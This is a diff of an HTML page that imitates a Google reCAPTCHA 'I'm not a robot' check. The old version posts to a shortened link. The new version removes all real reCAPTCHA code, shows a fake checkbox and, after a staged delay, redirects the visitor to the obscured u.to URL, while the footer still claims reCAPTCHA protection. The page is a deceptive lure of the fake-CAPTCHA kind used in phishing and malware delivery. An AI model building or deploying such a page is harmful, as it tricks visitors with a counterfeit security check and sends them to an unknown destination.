@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Google reCAPTCHA Verification</title>
+    <title>Human Verification</title>
     <style>
         body {
             font-family: 'Roboto', Arial, sans-serif;
@@ -13,65 +13,65 @@
             height: 100vh;
             margin: 0;
         }
-        .recaptcha-container {
+        .verification-box {
             background: white;
             border: 1px solid #d3d3d3;
             border-radius: 3px;
-            padding: 15px;
+            padding: 20px;
             width: 302px;
             box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            text-align: center;
         }
-        .recaptcha-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 15px;
+        .verification-header {
+            font-size: 16px;
+            color: #202124;
+            margin-bottom: 20px;
         }
-        .recaptcha-checkbox {
-            width: 22px;
-            height: 22px;
-            border: 1px solid #888;
-            margin-right: 10px;
-            position: relative;
+        .verification-checkbox {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #888;
+            margin: 0 auto 20px;
             cursor: pointer;
+            position: relative;
             background: white;
         }
-        .recaptcha-checkbox.checked {
+        .verification-checkbox.checked {
             background: #4285f4;
             border-color: #4285f4;
         }
-        .recaptcha-checkbox.checked::after {
+        .verification-checkbox.checked::after {
             content: "✓";
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             color: white;
-            font-size: 14px;
+            font-size: 16px;
             font-weight: bold;
         }
-        .recaptcha-label {
+        .verification-label {
             font-size: 14px;
             color: #202124;
+            margin-bottom: 20px;
         }
-        .recaptcha-text {
+        .verify-button {
+            background: #4285f4;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            width: 100%;
+        }
+        .verify-button:hover {
+            background: #3367d6;
+        }
+        .verification-footer {
             font-size: 11px;
             color: #757575;
-            margin-top: 10px;
-        }
-        .recaptcha-footer {
-            display: flex;
-            justify-content: space-between;
             margin-top: 15px;
-            font-size: 11px;
-            color: #757575;
-        }
-        .privacy-terms a {
-            color: #4285f4;
-            text-decoration: none;
-        }
-        .recaptcha-logo {
-            width: 60px;
-            opacity: 0.5;
         }
         .error-message {
             color: #d93025;
@@ -80,64 +80,49 @@
             display: none;
         }
     </style>
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+</head>
+<body>
+    <div class="verification-box">
+        <div class="verification-header">Verify you are human</div>
+        <div class="verification-checkbox" id="verification-checkbox" onclick="toggleCheckbox()"></div>
+        <div class="verification-label">I'm not a robot</div>
+        <button class="verify-button" onclick="verifyHuman()">Verify</button>
+        <div id="error-message" class="error-message">Please verify you are not a robot</div>
+        <div class="verification-footer">
+            Protected by reCAPTCHA<br>
+            <a href="#" style="color: #4285f4;">Privacy</a> - <a href="#" style="color: #4285f4;">Terms</a>
+        </div>
+    </div>
+
     <script>
-        function onSubmit(token) {
-            document.getElementById("recaptcha-form").submit();
+        function toggleCheckbox() {
+            const checkbox = document.getElementById('verification-checkbox');
+            checkbox.classList.toggle('checked');
+            document.getElementById('error-message').style.display = 'none';
         }
 
-        function onError() {
-            document.getElementById("error-message").style.display = "block";
-        }
+        function verifyHuman() {
+            const checkbox = document.getElementById('verification-checkbox');
 
-        function verifyCaptcha() {
-            const checkbox = document.getElementById('recaptcha-checkbox');
             if (checkbox.classList.contains('checked')) {
-                grecaptcha.execute();
+                // Simulate verification delay
+                checkbox.style.pointerEvents = 'none';
+                document.querySelector('.verify-button').disabled = true;
+
+                setTimeout(function() {
+                    window.location.href = "https://u.to/EhujIg";
+                }, 1500);
             } else {
-                document.getElementById("error-message").style.display = "block";
+                document.getElementById('error-message').style.display = 'block';
             }
         }
 
-        window.onload = function() {
-            const checkbox = document.getElementById('recaptcha-checkbox');
-            checkbox.addEventListener('click', function() {
-                this.classList.toggle('checked');
-                document.getElementById("error-message").style.display = "none";
-            });
-
-            // Initialize reCAPTCHA
-            grecaptcha.ready(function() {
-                grecaptcha.render('recaptcha-container', {
-                    'sitekey': '6LeM-V4tAAAAAPIHs_OpMim4mCwE2xydaNVK5Rbr',
-                    'callback': onSubmit,
-                    'error-callback': onError,
-                    'size': 'invisible'
-                });
-            });
-        };
+        // Auto-verify after checkbox is checked (optional)
+        document.getElementById('verification-checkbox').addEventListener('click', function() {
+            if (this.classList.contains('checked')) {
+                setTimeout(verifyHuman, 500);
+            }
+        });
     </script>
-</head>
-<body>
-    <form id="recaptcha-form" action="https://u.to/EhujIg" method="POST">
-        <div class="recaptcha-container">
-            <div class="recaptcha-header">
-                <div class="recaptcha-checkbox" id="recaptcha-checkbox"></div>
-                <div class="recaptcha-label">I'm not a robot</div>
-            </div>
-            <div class="recaptcha-text">This site is protected by reCAPTCHA and the Google <a href="#" onclick="return false;">Privacy Policy</a> and <a href="#" onclick="return false;">Terms of Service</a> apply.</div>
-            <div id="error-message" class="error-message">Please verify you are not a robot</div>
-            <div class="recaptcha-footer">
-                <div class="recaptcha-logo">
-                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAACvSURBVDhPY/j//z8DrmBgYGBg+M8A8uBhYGBgYGhv8PAAQEAQEAQEAQeB6IAAAAASUVORK5CYII=" alt="reCAPTCHA">
-                </div>
-                <div class="privacy-terms">
-                    <a href="#" onclick="return false;">Privacy</a> -
-                    <a href="#" onclick="return false;">Terms</a>
-                </div>
-            </div>
-        </div>
-        <div id="recaptcha-container"></div>
-    </form>
 </body>
 </html>
